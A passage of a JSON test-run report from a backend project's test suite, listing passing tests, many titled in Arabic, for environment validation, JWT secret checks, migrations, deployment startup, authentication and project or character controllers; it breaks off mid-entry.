{"numTotalTestSuites":521,"numPassedTestSuites":521,"numFailedTestSuites":0,"numPendingTestSuites":0,"numTotalTests":1192,"numPassedTests":1189,"numFailedTests":0,"numPendingTests":3,"numTodoTests":0,"snapshot":{"added":0,"failure":false,"filesAdded":0,"filesRemoved":0,"filesRemovedList":[],"filesUnmatched":0,"filesUpdated":0,"matched":0,"total":0,"unchecked":0,"uncheckedKeysByFile":[],"unmatched":0,"updated":0,"didUpdate":false},"startTime":1778420472589,"success":true,"testResults":[{"assertionResults":[{"ancestorTitles":["runtime alias bootstrap"],"fullName":"runtime alias bootstrap skips alias registration while running source files","status":"passed","title":"skips alias registration while running source files","duration":1.2373000000000047,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["runtime alias bootstrap"],"fullName":"runtime alias bootstrap maps compiled runtime paths back to the dist root","status":"passed","title":"maps compiled runtime paths back to the dist root","duration":0.25260000000002947,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["runtime alias bootstrap"],"fullName":"runtime alias bootstrap keeps nested compiled paths anchored at dist","status":"passed","title":"keeps nested compiled paths anchored at dist","duration":0.1893000000000029,"failureMessages":[],"meta":{},"tags":[]}],"startTime":1778420640125,"endTime":1778420640127.2527,"status":"passed","message":"","name":"F:/Claude/Projects/the copy/apps/backend/src/bootstrap/runtime-alias.test.ts"},{"assertionResults":[{"ancestorTitles":["breakapp security migration"],"fullName":"breakapp security migration does not recreate indexes already created by the base migration","status":"passed","title":"does not recreate indexes already created by the base migration","duration":1.4087000000000671,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["breakapp security migration"],"fullName":"breakapp security migration adds lookup indexes for device and audit hot paths","status":"passed","title":"adds lookup indexes for device and audit hot paths","duration":0.272199999999998,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["breakapp security migration"],"fullName":"breakapp security migration stores audit IP addresses as inet values","status":"passed","title":"stores audit IP addresses as inet values","duration":0.14790000000004966,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["breakapp security migration"],"fullName":"breakapp security migration deduplicates existing project memberships before adding uniqueness","status":"passed","title":"deduplicates existing project memberships before adding uniqueness","duration":0.17059999999992215,"failureMessages":[],"meta":{},"tags":[]}],"startTime":1778420672282,"endTime":1778420672284.2722,"status":"passed","message":"","name":"F:/Claude/Projects/the copy/apps/backend/src/config/breakapp-security-migration.test.ts"},{"assertionResults":[{"ancestorTitles":["deployment startup"],"fullName":"deployment startup runs reviewed database migrations before production start","status":"passed","title":"runs reviewed database migrations before production start","duration":1.16640000000001,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["deployment startup"],"fullName":"deployment startup uses the migration-aware production command in Render config","status":"passed","title":"uses the migration-aware production command in Render config","duration":17.290899999999965,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["deployment startup"],"fullName":"deployment startup uses the migration-aware production command in Procfile","status":"passed","title":"uses the migration-aware production command in Procfile","duration":27.915099999999995,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["deployment startup"],"fullName":"deployment startup uses the migration-aware production command in blue-green deploys","status":"passed","title":"uses the migration-aware production command in blue-green deploys","duration":40.68790000000001,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["deployment startup"],"fullName":"deployment startup provides the private registry token before deploy installs","status":"passed","title":"provides the private registry token before deploy installs","duration":28.618899999999996,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["deployment startup"],"fullName":"deployment startup uses fixed migrations in the Docker entrypoint","status":"passed","title":"uses fixed migrations in the Docker entrypoint","duration":0.6825999999999794,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["deployment startup"],"fullName":"deployment startup ships a bounded database readiness probe for production migrations","status":"passed","title":"ships a bounded database readiness probe for production migrations","duration":27.389399999999966,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["deployment startup"],"fullName":"deployment startup honors the configured backend health base url in runtime checks","status":"passed","title":"honors the configured backend health base url in runtime checks","duration":7.60590000000002,"failureMessages":[],"meta":{},"tags":[]}],"startTime":1778420640722,"endTime":1778420640873.606,"status":"passed","message":"","name":"F:/Claude/Projects/the copy/apps/backend/src/config/deployment-startup.test.ts"},{"assertionResults":[{"ancestorTitles":["env-safe optional infrastructure keys"],"fullName":"env-safe optional infrastructure keys does not fail production startup for optional persistent memory infra keys","status":"passed","title":"does not fail production startup for optional persistent memory infra keys","duration":8.967100000000016,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["env-safe optional infrastructure keys"],"fullName":"env-safe optional infrastructure keys still fails production startup when a blocking backend key is missing","status":"passed","title":"still fails production startup when a blocking backend key is missing","duration":8.245800000000031,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["env-safe optional infrastructure keys"],"fullName":"env-safe optional infrastructure keys does not fail when NODE_ENV is absent because env.ts owns its default","status":"passed","title":"does not fail when NODE_ENV is absent because env.ts owns its default","duration":7.352599999999995,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["env-safe optional infrastructure keys"],"fullName":"env-safe optional infrastructure keys treats message-only persistent memory infra keys as optional","status":"passed","title":"treats message-only persistent memory infra keys as optional","duration":7.15300000000002,"failureMessages":[],"meta":{},"tags":[]}],"startTime":1778420559510,"endTime":1778420559542.153,"status":"passed","message":"","name":"F:/Claude/Projects/the copy/apps/backend/src/config/env-safe.test.ts"},{"assertionResults":[{"ancestorTitles":["env validation"],"fullName":"env validation should parse valid environment variables","status":"passed","title":"should parse valid environment variables","duration":50.28820000000002,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["env validation"],"fullName":"env validation should use default values when not provided","status":"passed","title":"should use default values when not provided","duration":4.352399999999989,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["env validation"],"fullName":"env validation should validate NODE_ENV enum","status":"passed","title":"should validate NODE_ENV enum","duration":5.152099999999962,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["env validation"],"fullName":"env validation should reject weak JWT secrets in production","status":"passed","title":"should reject weak JWT secrets in production","duration":8.11379999999997,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["env validation"],"fullName":"env validation should handle test environment","status":"passed","title":"should handle test environment","duration":3.9120000000000346,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["env validation"],"fullName":"env validation should transform string PORT to number","status":"passed","title":"should transform string PORT to number","duration":4.114500000000021,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["env validation"],"fullName":"env validation should transform rate limit values to numbers","status":"passed","title":"should transform rate limit values to numbers","duration":4.190299999999979,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["isDevelopment helper"],"fullName":"isDevelopment helper should return true for development environment","status":"passed","title":"should return true for development environment","duration":6.046599999999955,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["isDevelopment helper"],"fullName":"isDevelopment helper should return false for production environment","status":"passed","title":"should return false for production environment","duration":6.371100000000013,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["isDevelopment helper"],"fullName":"isDevelopment helper should return false for test environment","status":"passed","title":"should return false for test environment","duration":4.555700000000002,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["isProduction helper"],"fullName":"isProduction helper should return true for production environment","status":"passed","title":"should return true for production environment","duration":6.246400000000051,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["isProduction helper"],"fullName":"isProduction helper should return false for development environment","status":"passed","title":"should return false for development environment","duration":4.914199999999994,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["isProduction helper"],"fullName":"isProduction helper should return false for test environment","status":"passed","title":"should return false for test environment","duration":4.800499999999943,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["optional environment variables"],"fullName":"optional environment variables should handle optional GOOGLE_GENAI_API_KEY","status":"passed","title":"should handle optional GOOGLE_GENAI_API_KEY","duration":4.221499999999992,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["optional environment variables"],"fullName":"optional environment variables should handle optional GEMINI_API_KEY","status":"passed","title":"should handle optional GEMINI_API_KEY","duration":3.506399999999985,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["optional environment variables"],"fullName":"optional environment variables should accept GOOGLE_GENAI_API_KEY when provided","status":"passed","title":"should accept GOOGLE_GENAI_API_KEY when provided","duration":3.420599999999922,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["optional environment variables"],"fullName":"optional environment variables should accept documented operational environment variables","status":"passed","title":"should accept documented operational environment variables","duration":3.503500000000031,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["optional environment variables"],"fullName":"optional environment variables should parse Weaviate operational flags and timeout values","status":"passed","title":"should parse Weaviate operational flags and timeout values","duration":3.331600000000094,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["optional environment variables"],"fullName":"optional environment variables should reject requiring Weaviate when memory system is disabled","status":"passed","title":"should reject requiring Weaviate when memory system is disabled","duration":3.494000000000028,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["JWT_SECRET_PREVIOUS validation in production"],"fullName":"JWT_SECRET_PREVIOUS validation in production should accept valid JWT_SECRET_PREVIOUS in production","status":"passed","title":"should accept valid JWT_SECRET_PREVIOUS in production","duration":5.383500000000026,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["JWT_SECRET_PREVIOUS validation in production"],"fullName":"JWT_SECRET_PREVIOUS validation in production should accept multiple previous secrets separated by commas","status":"passed","title":"should accept multiple previous secrets separated by commas","duration":5.565299999999979,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["JWT_SECRET_PREVIOUS validation in production"],"fullName":"JWT_SECRET_PREVIOUS validation in production should reject JWT_SECRET_PREVIOUS with less than 32 characters in production","status":"passed","title":"should reject JWT_SECRET_PREVIOUS with less than 32 characters in production","duration":5.556600000000003,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["JWT_SECRET_PREVIOUS validation in production"],"fullName":"JWT_SECRET_PREVIOUS validation in production should reject JWT_SECRET_PREVIOUS containing default placeholder values","status":"passed","title":"should reject JWT_SECRET_PREVIOUS containing default placeholder values","duration":5.101299999999924,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["JWT_SECRET_PREVIOUS validation in production"],"fullName":"JWT_SECRET_PREVIOUS validation in production should reject JWT_SECRET_PREVIOUS when it equals current JWT_SECRET","status":"passed","title":"should reject JWT_SECRET_PREVIOUS when it equals current JWT_SECRET","duration":5.424599999999941,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["JWT_SECRET_PREVIOUS validation in production"],"fullName":"JWT_SECRET_PREVIOUS validation in production should reject any JWT_SECRET_PREVIOUS entry that equals current JWT_SECRET in a list","status":"passed","title":"should reject any JWT_SECRET_PREVIOUS entry that equals current JWT_SECRET in a list","duration":4.912899999999922,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["JWT_SECRET default value validation in production"],"fullName":"JWT_SECRET default value validation in production should reject default JWT_SECRET value in production","status":"passed","title":"should reject default JWT_SECRET value in production","duration":5.863900000000058,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["JWT_SECRET default value validation in production"],"fullName":"JWT_SECRET default value validation in production should reject JWT_SECRET containing CHANGE-THIS placeholder in production","status":"passed","title":"should reject JWT_SECRET containing CHANGE-THIS placeholder in production","duration":5.303200000000061,"failureMessages":[],"meta":{},"tags":[]}],"startTime":1778420547713,"endTime":1778420547892.3032,"status":"passed","message":"","name":"F:/Claude/Projects/the copy/apps/backend/src/config/env.test.ts"},{"assertionResults":[{"ancestorTitles":["runSevenStationsPipeline"],"fullName":"runSevenStationsPipeline يعالج النص عبر خدمة التحليل المباشرة","status":"passed","title":"يعالج النص عبر خدمة التحليل المباشرة","duration":3.659999999999968,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["runSevenStationsPipeline"],"fullName":"runSevenStationsPipeline يعيد 400 عندما يغيب النص","status":"passed","title":"يعيد 400 عندما يغيب النص","duration":1.0072000000000116,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["runSevenStationsPipeline"],"fullName":"runSevenStationsPipeline يعيد 400 عندما يكون النص فارغاً","status":"passed","title":"يعيد 400 عندما يكون النص فارغاً","duration":0.4699999999999136,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["runSevenStationsPipeline"],"fullName":"runSevenStationsPipeline يحوّل الطلب إلى قائمة الانتظار في النمط غير المتزامن","status":"passed","title":"يحوّل الطلب إلى قائمة الانتظار في النمط غير المتزامن","duration":0.8763000000000147,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["runSevenStationsPipeline"],"fullName":"runSevenStationsPipeline يعيد 500 عندما تفشل خدمة التحليل","status":"passed","title":"يعيد 500 عندما تفشل خدمة التحليل","duration":4.41070000000002,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["getStationDetails"],"fullName":"getStationDetails يعيد معلومات المحطات السبع","status":"passed","title":"يعيد معلومات المحطات السبع","duration":0.8777999999999793,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["public streaming sessions"],"fullName":"public streaming sessions ينشئ جلسة بث عامة بمالك مشتق من الطلب وليس مالكاً مجهولاً عاماً","status":"passed","title":"ينشئ جلسة بث عامة بمالك مشتق من الطلب وليس مالكاً مجهولاً عاماً","duration":1.7471000000000458,"failureMessages":[],"meta":{},"tags":[]}],"startTime":1778420580801,"endTime":1778420580814.747,"status":"passed","message":"","name":"F:/Claude/Projects/the copy/apps/backend/src/controllers/analysis.controller.test.ts"},{"assertionResults":[{"ancestorTitles":["signup"],"fullName":"signup should successfully create a new user","status":"passed","title":"should successfully create a new user","duration":4.390899999999988,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["signup"],"fullName":"signup should handle validation errors","status":"passed","title":"should handle validation errors","duration":0.9725999999999999,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["signup"],"fullName":"signup should handle duplicate email error","status":"passed","title":"should handle duplicate email error","duration":3.341600000000028,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["signup"],"fullName":"signup should hide database query errors from signup responses","status":"passed","title":"should hide database query errors from signup responses","duration":0.8166999999999689,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["signup"],"fullName":"signup should work with optional firstName and lastName","status":"passed","title":"should work with optional firstName and lastName","duration":0.3451000000000022,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["login"],"fullName":"login should successfully login user","status":"passed","title":"should successfully login user","duration":0.6407999999999561,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["login"],"fullName":"login should handle validation errors","status":"passed","title":"should handle validation errors","duration":0.3896000000000299,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["login"],"fullName":"login should handle invalid credentials","status":"passed","title":"should handle invalid credentials","duration":0.6861000000000104,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["login"],"fullName":"login should hide database query errors from login responses","status":"passed","title":"should hide database query errors from login responses","duration":0.8074000000000296,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["logout"],"fullName":"logout should successfully logout user","status":"passed","title":"should successfully logout user","duration":0.39599999999995816,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["getCurrentUser"],"fullName":"getCurrentUser should return current user","status":"passed","title":"should return current user","duration":0.30989999999997053,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["getCurrentUser"],"fullName":"getCurrentUser should return 401 if user not authenticated","status":"passed","title":"should return 401 if user not authenticated","duration":0.18790000000001328,"failureMessages":[],"meta":{},"tags":[]}],"startTime":1778420578779,"endTime":1778420578792.396,"status":"passed","message":"","name":"F:/Claude/Projects/the copy/apps/backend/src/controllers/auth.controller.test.ts"},{"assertionResults":[{"ancestorTitles":["BreakdownController"],"fullName":"BreakdownController يعيد الحالة الصحية للخدمة","status":"passed","title":"يعيد الحالة الصحية للخدمة","duration":2.960800000000006,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["BreakdownController"],"fullName":"BreakdownController يرفض طلب التهيئة إذا غاب نص السيناريو","status":"passed","title":"يرفض طلب التهيئة إذا غاب نص السيناريو","duration":1.6848000000000525,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["BreakdownController"],"fullName":"BreakdownController يعيد 404 إذا لم يجد تقرير المشروع","status":"passed","title":"يعيد 404 إذا لم يجد تقرير المشروع","duration":0.8441000000000258,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["BreakdownController"],"fullName":"BreakdownController يحوّل أخطاء الكيان غير الموجود إلى 404","status":"passed","title":"يحوّل أخطاء الكيان غير الموجود إلى 404","duration":0.5858000000000061,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["BreakdownController"],"fullName":"BreakdownController يرفض أي طلب محمي إذا غاب المستخدم المصادق","status":"passed","title":"يرفض أي طلب محمي إذا غاب المستخدم المصادق","duration":0.5364999999999895,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["BreakdownController"],"fullName":"BreakdownController يمرر معرف المستخدم إلى خدمة التهيئة","status":"passed","title":"يمرر معرف المستخدم إلى خدمة التهيئة","duration":0.29640000000000555,"failureMessages":[],"meta":{},"tags":[]}],"startTime":1778420609100,"endTime":1778420609106.5366,"status":"passed","message":"","name":"F:/Claude/Projects/the copy/apps/backend/src/controllers/breakdown.controller.test.ts"},{"assertionResults":[{"ancestorTitles":["جلب قائمة الشخصيات"],"fullName":"جلب قائمة الشخصيات يعيد شخصيات المشروع بعد التحقق من ملكية المستخدم","status":"passed","title":"يعيد شخصيات المشروع بعد التحقق من ملكية المستخدم","duration":2.6090000000000373,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["جلب قائمة الشخصيات"],"fullName":"جلب قائمة الشخصيات يرفض الطلب عند غياب المستخدم المصادق","status":"passed","title":"يرفض الطلب عند غياب المستخدم المصادق","duration":0.5731999999999857,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["جلب قائمة الشخصيات"],"fullName":"جلب قائمة الشخصيات يعيد خطأ طلب عند غياب معرف المشروع","status":"passed","title":"يعيد خطأ طلب عند غياب معرف المشروع","duration":0.42859999999996035,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["جلب قائمة الشخصيات"],"fullName":"جلب قائمة الشخصيات يعيد عدم العثور عندما لا يملك المستخدم المشروع","status":"passed","title":"يعيد عدم العثور عندما لا يملك المستخدم المشروع","duration":0.4037000000000148,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["جلب شخصية واحدة"],"fullName":"جلب شخصية واحدة يعيد الشخصية بعد التحقق من ملكية مشروعها","status":"passed","title":"يعيد الشخصية بعد التحقق من ملكية مشروعها","duration":0.5640999999999963,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["جلب شخصية واحدة"],"fullName":"جلب شخصية واحدة يعيد عدم العثور عند غياب الشخصية","status":"passed","title":"يعيد عدم العثور عند غياب الشخصية","duration":0.3795000000000073,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["جلب شخصية واحدة"],"fullName":"جلب شخصية واحدة يرفض الوصول عندما تكون الشخصية في مشروع غير مملوك","status":"passed","title":"يرفض الوصول عندما تكون الشخصية في مشروع غير مملوك","duration":0.29000000000002046,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["إنشاء الشخصيات"],"fullName":"إنشاء الشخصيات ينشئ شخصية صحيحة ويطبق القيم الافتراضية الصارمة","status":"passed","title":"ينشئ شخصية صحيحة ويطبق القيم الافتراضية الصارمة","duration":1.7101000000000113,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["إنشاء الشخصيات"],"fullName":"إنشاء الشخصيات يرفض بيانات الإنشاء الفاسدة قبل الوصول لقاعدة البيانات","status":"passed","title":"يرفض بيانات الإنشاء الفاسدة قبل الوصول لقاعدة البيانات","duration":1.6353000000000293,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["إنشاء الشخصيات"],"fullName":"إنشاء الشخصيات يعيد عدم العثور عندما لا يكون المشروع مملوكًا للمستخدم","status":"passed","title":"يعيد عدم العثور عندما لا يكون المشروع مملوكًا للمستخدم","duration":0.6861999999999853,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["إنشاء الشخصيات"],"fullName":"إنشاء الشخصيات يعيد خطأ خادم عندما لا ترجع قاعدة البيانات السجل المنشأ","status":"passed","title":"يعيد خطأ خادم عندما لا ترجع قاعدة البيانات السجل المنشأ","duration":0.5455000000000041,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["تحديث الشخصيات"],"fullName":"تحديث الشخصيات يحدث الشخصية بعد التحقق من الوجود والملكية وصحة البيانات","status":"passed","title":"يحدث الشخصية بعد التحقق من الوجود والملكية وصحة البيانات","duration":0.5566000000000031,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["تحديث الشخصيات"],"fullName":"تحديث الشخصيات يرفض بيانات التحديث الحدية غير الصالحة قبل القراءة من قاعدة البيانات","status":"passed","title":"يرفض بيانات التحديث الحدية غير الصالحة قبل القراءة من قاعدة البيانات","duration":0.345799999999997,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["تحديث الشخصيات"],"fullName":"تحديث الشخصيات يعيد عدم العثور عند محاولة تحديث شخصية غير موجودة","status":"passed","title":"يعيد عدم العثور عند محاولة تحديث شخصية غير موجودة","duration":0.19369999999997844,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["تحديث الشخصيات"],"fullName":"تحديث الشخصيات يرفض تحديث شخصية لا يملك المستخدم مشروعها","status":"passed","title":"يرفض تحديث شخصية لا يملك المستخدم مشروعها","duration":0.322400000000016,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["حذف الشخصيات وأخطاء الاعتماد"],"fullName":"حذف الشخصيات وأخطاء الاعتماد يحذف الشخصية بعد التحقق من ملكية مشروعها","status":"passed","title":"يحذف الشخصية بعد التحقق من ملكية مشروعها","duration":0.30270000000001573,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["حذف الشخصيات وأخطاء الاعتماد"],"fullName":"حذف الشخصيات وأخطاء الاعتماد يعيد طلبًا غير صالح عند غياب معرف الشخصية في الحذف","status":"passed","title":"يعيد طلبًا غير صالح عند غياب معرف الشخصية في الحذف","duration":0.23069999999995616,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["حذف الشخصيات وأخطاء الاعتماد"],"fullName":"حذف الشخصيات وأخطاء الاعتماد يحمي مسار الجلب من أخطاء قاعدة البيانات الخارجية","status":"passed","title":"يحمي مسار الجلب من أخطاء قاعدة البيانات الخارجية","duration":0.7547000000000139,"failureMessages":[],"meta":{},"tags":[]}],"startTime":1778420589421,"endTime":1778420589433.7546,"status":"passed","message":"","name":"F:/Claude/Projects/the copy/apps/backend/src/controllers/characters.controller.test.ts"},{"assertionResults":[{"ancestorTitles":["M1.1 — ضمان JSON في كل حالات HTTP (200 / 4xx / 5xx)","HTTP 200 — نجاح التحليل"],"fullName":"M1.1 — ضمان JSON في كل حالات HTTP (200 / 4xx / 5xx) HTTP 200 — نجاح التحليل 200: Content-Type يجب أن يكون application/json","status":"passed","title":"200: Content-Type يجب أن يكون application/json","duration":28.925399999999627,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["M1.1 — ضمان JSON في كل حالات HTTP (200 / 4xx / 5xx)","HTTP 200 — نجاح التحليل"],"fullName":"M1.1 — ضمان JSON في كل حالات HTTP (200 / 4xx / 5xx) HTTP 200 — نجاح التحليل 200: الرد يحتوي success: true","status":"passed","title":"200: الرد يحتوي success: true","duration":4.313999999999851,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["M1.1 — ضمان JSON في كل حالات HTTP (200 / 4xx / 5xx)","HTTP 200 — نجاح التحليل"],"fullName":"M1.1 — ضمان JSON في كل حالات HTTP (200 / 4xx / 5xx) HTTP 200 — نجاح التحليل 200: start يُرجع analysisId","status":"passed","title":"200: start يُرجع analysisId","duration":3.305200000000241,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["M1.1 — ضمان JSON في كل حالات HTTP (200 / 4xx / 5xx)","HTTP 400 — بيانات خاطئة"],"fullName":"M1.1 — ضمان JSON في كل حالات HTTP (200 / 4xx / 5xx) HTTP 400 — بيانات خاطئة 400: نص فارغ → JSON {error, code} لا HTML","status":"passed","title":"400: نص فارغ → JSON {error, code} لا HTML","duration":3.230199999999968,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["M1.1 — ضمان JSON في كل حالات HTTP (200 / 4xx / 5xx)","HTTP 400 — بيانات خاطئة"],"fullName":"M1.1 — ضمان JSON في كل حالات HTTP (200 / 4xx / 5xx) HTTP 400 — بيانات خاطئة 400: body فارغ تماماً → JSON لا HTML","status":"passed","title":"400: body فارغ تماماً → JSON لا HTML","duration":3.378900000000158,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["M1.1 — ضمان JSON في كل حالات HTTP (200 / 4xx / 5xx)","HTTP 400 — بيانات خاطئة"],"fullName":"M1.1 — ضمان JSON في كل حالات HTTP (200 / 4xx / 5xx) HTTP 400 — بيانات خاطئة 400: يتضمن code في الرد","status":"passed","title":"400: يتضمن code في الرد","duration":2.7036999999995714,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["M1.1 — ضمان JSON في كل حالات HTTP (200 / 4xx / 5xx)","HTTP 404 — مسار غير موجود"],"fullName":"M1.1 — ضمان JSON في كل حالات HTTP (200 / 4xx / 5xx) HTTP 404 — مسار غير موجود 404: مسار مجهول → JSON لا HTML","status":"passed","title":"404: مسار مجهول → JSON لا HTML","duration":2.7282000000000153,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["M1.1 — ضمان JSON في كل حالات HTTP (200 / 4xx / 5xx)","HTTP 404 — مسار غير موجود"],"fullName":"M1.1 — ضمان JSON في كل حالات HTTP (200 / 4xx / 5xx) HTTP 404 — مسار غير موجود 404: GET على مسار POST-only → JSON لا HTML","status":"passed","title":"404: GET على مسار POST-only → JSON لا HTML","duration":2.6068999999997686,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["M1.1 — ضمان JSON في كل حالات HTTP (200 / 4xx / 5xx)","HTTP 500 — خطأ داخلي"],"fullName":"M1.1 — ضمان JSON في كل حالات HTTP (200 / 4xx / 5xx) HTTP 500 — خطأ داخلي 500: استثناء غير متوقع → JSON {error, traceId} لا HTML","status":"passed","title":"500: استثناء غير متوقع → JSON {error, traceId} لا HTML","duration":4.500700000000052,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["M1.1 — ضمان JSON في كل حالات HTTP (200 / 4xx / 5xx)","HTTP 500 — خطأ داخلي"],"fullName":"M1.1 — ضمان JSON في كل حالات HTTP (200 / 4xx / 5xx) HTTP 500 — خطأ داخلي 500: فشل خدمة التحليل → JSON لا HTML","status":"passed","title":"500: فشل خدمة التحليل → JSON لا HTML","duration":3.4153000000001157,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["M1.1 — ضمان JSON في كل حالات HTTP (200 / 4xx / 5xx)","HTTP 500 — خطأ داخلي"],"fullName":"M1.1 — ضمان JSON في كل حالات HTTP (200 / 4xx / 5xx) HTTP 500 — خطأ داخلي 500: traceId مختلف في كل طلب","status":"passed","title":"500: traceId مختلف في كل طلب","duration":4.677799999999934,"failureMessages":[],"meta":{},"tags":[]}],"startTime":1778420559153,"endTime":1778420559217.6777,"status":"passed","message":"","name":"F:/Claude/Projects/the copy/apps/backend/src/controllers/controllers.integration.test.ts"},{"assertionResults":[{"ancestorTitles":[],"fullName":"returns not_ready when the AI provider probe fails","status":"passed","title":"returns not_ready when the AI provider probe fails","duration":3.512299999999982,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":[],"fullName":"returns not_ready when required database schema tables are missing","status":"passed","title":"returns not_ready when required database schema tables are missing","duration":0.9351999999998952,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":[],"fullName":"reports unhealthy disk usage from real filesystem statistics instead of a mock value","status":"passed","title":"reports unhealthy disk usage from real filesystem statistics instead of a mock value","duration":1.0068999999999733,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":[],"fullName":"returns degraded health when optional weaviate is unavailable","status":"passed","title":"returns degraded health when optional weaviate is unavailable","duration":0.6843000000000075,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":[],"fullName":"returns not_ready when required weaviate is unavailable","status":"passed","title":"returns not_ready when required weaviate is unavailable","duration":0.5183999999999287,"failureMessages":[],"meta":{},"tags":[]}],"startTime":1778420604730,"endTime":1778420604737.5183,"status":"passed","message":"","name":"F:/Claude/Projects/the copy/apps/backend/src/controllers/health.controller.test.ts"},{"assertionResults":[{"ancestorTitles":["getProjects"],"fullName":"getProjects should return projects for authorized user","status":"passed","title":"should return projects for authorized user","duration":2.586999999999989,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["getProjects"],"fullName":"getProjects should return 401 for unauthorized user","status":"passed","title":"should return 401 for unauthorized user","duration":0.9819999999999709,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["getProject"],"fullName":"getProject should return project for authorized user","status":"passed","title":"should return project for authorized user","duration":0.5372000000000412,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["getProject"],"fullName":"getProject should return 401 for unauthorized user","status":"passed","title":"should return 401 for unauthorized user","duration":0.3476999999999748,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["getProject"],"fullName":"getProject should return 400 when project ID is missing","status":"passed","title":"should return 400 when project ID is 